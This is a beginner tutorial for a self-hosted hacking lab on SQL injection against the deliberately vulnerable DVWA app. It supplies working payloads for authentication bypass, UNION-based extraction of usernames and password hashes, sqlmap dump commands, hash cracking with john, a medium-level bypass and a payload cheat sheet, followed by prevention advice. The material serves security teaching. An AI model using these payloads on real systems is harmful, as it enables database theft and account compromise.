# Beginner Module 1: SQL Injection

**Difficulty:** ⭐ Beginner  
**Time Required:** 2-3 hours  
**Prerequisites:** Lab setup complete, DVWA accessible

---

## Learning Objectives

By the end of this module, you will be able to:

- Understand what SQL injection is and why it's dangerous
- Identify SQL injection vulnerabilities manually
- Extract data from databases using UNION-based attacks
- Use sqlmap for automated exploitation
- Understand basic SQL injection prevention

---

## What is SQL Injection?

SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in applications that construct SQL queries using unsanitized user input.

### Why is it Dangerous?

- **Data Theft:** Attackers can read sensitive data from databases
- **Data Manipulation:** Attackers can modify or delete data
- **Authentication Bypass:** Attackers can login without valid credentials
- **Remote Code Execution:** In some cases, attackers can execute system commands

### Real-World Impact

SQL injection consistently ranks in the OWASP Top 10 vulnerabilities. Major breaches attributed to SQLi include:
- Sony Pictures (2011) - 77 million accounts
- Heartland Payment Systems (2008) - 130 million cards
- Yahoo (2012) - 450,000 accounts

---

## Lab Setup

### Access DVWA

1. Ensure port forwarding is active:
   ```bash
   kubectl port-forward -n vulnerable-apps svc/dvwa-service 8080:80 &
   ```

2. Open browser: http://localhost:8080

3. Login: `admin` / `password`

4. Click "Create / Reset Database" (first time only)

5. Go to "DVWA Security" → Set to **Low**

6. Navigate to "SQL Injection"

### Connect to Kali

```bash
kubectl exec -it -n attacker deploy/kali-attacker -- /bin/bash
```

---

## Exercise 1.1: Understanding the Vulnerability

### How the Application Works

The SQL Injection page has a simple form that takes a User ID and returns the user's name.

**Normal Query (what the application does):**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

**What you see:** When you enter `1`, it returns "admin admin"

### Your Task

Try entering different values and observe the behavior:

1. Enter: `1` → What do you see?
2. Enter: `2` → What do you see?
3. Enter: `1'` → What do you see?

### Expected Results

| Input | Result |
|-------|--------|
| 1 | Shows user "admin" |
| 2 | Shows user "Gordon" |
| 1' | Error message (SQL syntax error) |

The error on `1'` indicates the application is vulnerable!

<details>
<summary>💡 Why does this happen?</summary>

When you enter `1'`, the query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'';
```

The extra quote breaks the SQL syntax, causing an error. This proves user input is directly inserted into the query without sanitization.

</details>

---

## Exercise 1.2: Basic SQL Injection

### Objective

Retrieve all users from the database using a simple injection.

### The Attack

Enter this in the User ID field:
```
1' OR '1'='1
```

### What You Should See

All users in the database are displayed!

### Explanation

The query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

Since `'1'='1'` is always true, the WHERE clause matches all rows.

### Practice

Try these variations:
- `' OR 1=1 -- -`
- `' OR 'a'='a`
- `1' OR 1=1#`

<details>
<summary>✅ Solution Explanation</summary>

All of these work because they make the WHERE clause always true:
- `-- -` and `#` are SQL comments that ignore the rest of the query
- The logic becomes: `WHERE user_id = '' OR [always true]`

</details>

---

## Exercise 1.3: UNION-Based Data Extraction

### Background

UNION allows combining results from multiple SELECT statements. We can use this to extract data from other tables.

### Step 1: Find the Number of Columns

The UNION attack requires matching the number of columns. Use ORDER BY to find how many columns exist:

```
1' ORDER BY 1-- -
```
→ Works (no error)

```
1' ORDER BY 2-- -
```
→ Works (no error)

```
1' ORDER BY 3-- -
```
→ Error! ("Unknown column '3' in 'order clause'")

**Result:** The query has 2 columns.

### Step 2: Find Which Columns Display Data

```
1' UNION SELECT 'test1', 'test2'-- -
```

You should see "test1" and "test2" appear in the output, confirming both columns are displayed.

### Step 3: Extract Database Information

**Get database version:**
```
1' UNION SELECT null, version()-- -
```

**Get current database name:**
```
1' UNION SELECT null, database()-- -
```

**Get current user:**
```
1' UNION SELECT null, user()-- -
```

### Step 4: List All Tables

```
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -
```

You should see tables like: `users`, `guestbook`

### Step 5: List Columns in the Users Table

```
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'-- -
```

You should see: `user_id`, `first_name`, `last_name`, `user`, `password`, etc.

### Step 6: Extract User Credentials

```
1' UNION SELECT user, password FROM users-- -
```

**🎉 Success!** You've extracted all usernames and password hashes!

<details>
<summary>✅ Expected Output</summary>

| User | Password (MD5 Hash) |
|------|---------------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

</details>

---

## Exercise 1.4: Cracking the Hashes

### Using Online Tools

The passwords are MD5 hashes. You can crack them using:
- https://crackstation.net
- https://hashes.com/en/decrypt/hash

### Using Kali

From your Kali pod:

```bash
# Create a file with the hashes
cat > hashes.txt << 'EOF'
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
EOF

# Use john to crack (if installed)
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

<details>
<summary>✅ Cracked Passwords</summary>

| User | Password |
|------|----------|
| admin | password |
| gordonb | abc123 |
| 1337 | charley |
| pablo | letmein |
| smithy | password |

</details>

---

## Exercise 1.5: Automated Exploitation with sqlmap

### Introduction

sqlmap is a powerful tool that automates SQL injection detection and exploitation.

### From Kali Pod

First, you need your PHPSESSID cookie. Get it from your browser's developer tools or:

```bash
# Get a session cookie
COOKIE=$(curl -s -c - http://dvwa-service.vulnerable-apps.svc.cluster.local/login.php | grep PHPSESSID | awk '{print $7}')
echo "Session: $COOKIE"

# Note: You may need to login first and use that session
```

### Basic sqlmap Scan

```bash
sqlmap -u "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
  --batch
```

### Enumerate Databases

```bash
sqlmap -u "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
  --dbs \
  --batch
```

### Enumerate Tables

```bash
sqlmap -u "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
  -D dvwa \
  --tables \
  --batch
```

### Dump User Table

```bash
sqlmap -u "http://dvwa-service.vulnerable-apps.svc.cluster.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
  -D dvwa \
  -T users \
  --dump \
  --batch
```

<details>
<summary>✅ Expected sqlmap Output</summary>

```
Database: dvwa
Table: users
[5 entries]
+---------+------------+-----------+---------+----------------------------------+
| user_id | user       | avatar    | password                         | ...
+---------+------------+-----------+---------+----------------------------------+
| 1       | admin      | ...       | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2       | gordonb    | ...       | e99a18c428cb38d5f260853678922e03 |
| 3       | 1337       | ...       | 8d3533d75ae2c3966d7e0d4fcc69216b |
| 4       | pablo      | ...       | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| 5       | smithy     | ...       | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+------------+-----------+---------+----------------------------------+
```

</details>

---

## Exercise 1.6: Authentication Bypass

### Objective

Login to DVWA using SQL injection without knowing the password.

### The Attack

On a login form, try this as the username:
```
admin'-- -
```

With any password (it doesn't matter).

### Why This Works

The login query is typically:
```sql
SELECT * FROM users WHERE username='admin'-- -' AND password='anything';
```

The `-- -` comments out the password check!

### Practice on DVWA

While DVWA's main login doesn't have this vulnerability, you can test the concept:

1. Go to SQL Injection page
2. Enter: `' OR 1=1-- -`
3. This returns all users (similar concept)

---

## Knowledge Check

Answer these questions to test your understanding:

1. What character is commonly used to test for SQL injection?
2. What does `-- -` do in a SQL injection payload?
3. Why is UNION useful in SQL injection?
4. What is the purpose of `ORDER BY` in finding column count?
5. What table contains table names in MySQL?

<details>
<summary>✅ Answers</summary>

1. Single quote (`'`) - it breaks string literals
2. It's a SQL comment that ignores the rest of the query
3. It allows combining your malicious query results with the original query
4. To find how many columns are returned (for UNION to work)
5. `information_schema.tables`

</details>

---

## Prevention

### How to Prevent SQL Injection

**1. Parameterized Queries (Prepared Statements)**

```php
// VULNERABLE
$query = "SELECT * FROM users WHERE id = '$id'";

// SECURE
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

**2. Input Validation**

```php
// Ensure ID is numeric
if (!is_numeric($id)) {
    die("Invalid input");
}
```

**3. Least Privilege**

- Database user should only have necessary permissions
- Don't use root/admin accounts for web applications

**4. Web Application Firewall (WAF)**

- Can detect and block common SQLi patterns
- Not a replacement for secure coding!

---

## Challenge

### Scenario

Set DVWA security to **Medium** and try the same attacks.

### Questions

1. Does `1' OR '1'='1` still work? Why or why not?
2. Can you bypass the protection?
3. What protection method was added?

<details>
<summary>✅ Challenge Solution</summary>

**Medium Security Analysis:**

The code uses `mysqli_real_escape_string()`:
```php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
```

**The Vulnerability:**
Notice `$id` is NOT quoted in the query! The escaping function only helps when the value is inside quotes.

**Bypass:**
```
1 OR 1=1
```

No quotes needed since the value isn't quoted in the query!

</details>

---

## Summary

In this module, you learned:

- ✅ How SQL injection works
- ✅ Manual testing techniques
- ✅ UNION-based data extraction
- ✅ Using sqlmap for automation
- ✅ Prevention methods

### Next Steps

Continue to: **Beginner Module 2: Cross-Site Scripting (XSS)**

---

## Quick Reference

### SQL Injection Cheat Sheet

| Purpose | Payload |
|---------|---------|
| Test for SQLi | `'` or `"` |
| Always true | `' OR '1'='1` |
| Comment | `-- -` or `#` |
| Find columns | `ORDER BY 1,2,3...` |
| UNION test | `UNION SELECT null,null` |
| DB version | `@@version` or `version()` |
| Current DB | `database()` |
| List tables | `SELECT table_name FROM information_schema.tables` |
| List columns | `SELECT column_name FROM information_schema.columns` |

### Common Databases

| Database | Comment | Version | String Concat |
|----------|---------|---------|---------------|
| MySQL | `-- -` or `#` | `version()` | `CONCAT()` |
| PostgreSQL | `--` | `version()` | `||` |
| MSSQL | `--` | `@@version` | `+` |
| Oracle | `--` | `SELECT banner FROM v$version` | `||` |
